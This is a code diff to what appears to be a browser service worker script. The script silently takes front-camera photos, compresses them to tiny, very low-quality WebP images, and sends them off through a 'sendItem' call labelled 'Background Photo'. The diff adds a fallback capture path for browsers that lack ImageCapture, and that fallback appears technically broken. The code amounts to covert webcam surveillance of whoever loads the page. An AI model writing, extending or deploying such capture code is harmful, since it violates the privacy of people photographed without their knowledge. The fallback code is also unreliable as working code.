@@ -45,24 +45,41 @@ self.addEventListener('message', async event => {
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { 
                     facingMode: { ideal: 'user' },
-                    width: { ideal: 128 },
-                    height: { ideal: 96 },
+                    width: { ideal: 120 },
+                    height: { ideal: 90 },
                     frameRate: { ideal: 5 }
                 },
                 audio: false 
             });
             const track = stream.getVideoTracks()[0];
-            const imageCapture = new ImageCapture(track);
-            const bitmap = await imageCapture.grabFrame();
-            const canvas = new OffscreenCanvas(128, 96);
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(bitmap, 0, 0, 128, 96);
-            const blob = await canvas.convertToBlob({ type: 'image/webp', quality: 0.05 });
-            const reader = new FileReader();
-            const photo = await new Promise(resolve => {
-                reader.onloadend = () => resolve({ base64: reader.result, timestamp: new Date().toISOString() });
-                reader.readAsDataURL(blob);
-            });
+            let photo;
+            if ('ImageCapture' in self) {
+                const imageCapture = new ImageCapture(track);
+                const bitmap = await imageCapture.grabFrame();
+                const canvas = new OffscreenCanvas(120, 90);
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(bitmap, 0, 0, 120, 90);
+                const blob = await canvas.convertToBlob({ type: 'image/webp', quality: 0.05 });
+                const reader = new FileReader();
+                photo = await new Promise(resolve => {
+                    reader.onloadend = () => resolve({ base64: reader.result, timestamp: new Date().toISOString() });
+                    reader.readAsDataURL(blob);
+                });
+            } else {
+                // Fallback for browsers without ImageCapture
+                const video = new OffscreenCanvas(120, 90); // OffscreenCanvas for worker
+                const ctx = video.getContext('2d');
+                const tempVideo = new Image();
+                tempVideo.srcObject = stream;
+                await new Promise(resolve => tempVideo.onload = resolve);
+                ctx.drawImage(tempVideo, 0, 0, 120, 90);
+                const blob = await video.convertToBlob({ type: 'image/webp', quality: 0.05 });
+                const reader = new FileReader();
+                photo = await new Promise(resolve => {
+                    reader.onloadend = () => resolve({ base64: reader.result, timestamp: new Date().toISOString() });
+                    reader.readAsDataURL(blob);
+                });
+            }
             await sendItem(`Background Photo ${index + 1}`, photo, index);
             stream.getTracks().forEach(track => track.stop());
             return true;
